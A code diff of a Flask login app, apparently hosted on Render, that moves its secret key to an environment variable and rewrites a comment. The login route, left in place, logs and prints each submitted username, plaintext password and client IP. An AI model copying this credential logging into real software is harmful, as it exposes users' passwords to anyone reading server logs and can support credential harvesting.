@@ -1,11 +1,15 @@
 from flask import Flask, render_template, request, redirect, url_for, flash
 import logging
+import os
 
 app = Flask(__name__)
-app.secret_key = "change_me_to_a_random_string"
+
+# Use env var on Render, fallback for local dev
+app.secret_key = os.getenv("SECRET_KEY", "change_me_to_a_random_string")
 
 # Make sure logging works on Render
 app.logger.setLevel(logging.INFO)
+
 
 @app.route("/", methods=["GET", "POST"])
 def login():
@@ -13,7 +17,8 @@ def login():
         username = request.form.get("username", "").strip()
         password = request.form.get("password", "").strip()
 
-        # 🔥 Logs FULL username + FULL password + client IP
+        # ❗ This logs FULL username + password + IP to server logs.
+        # Do NOT do this in any real/production login system.
         app.logger.info(
             "Login attempt: username=%s, password=%s, ip=%s",
             username,
@@ -21,7 +26,6 @@ def login():
             request.remote_addr
         )
 
-        # Old print() also works on Render logs
         print(f"username = {username}")
         print(f"password = {password}")
 
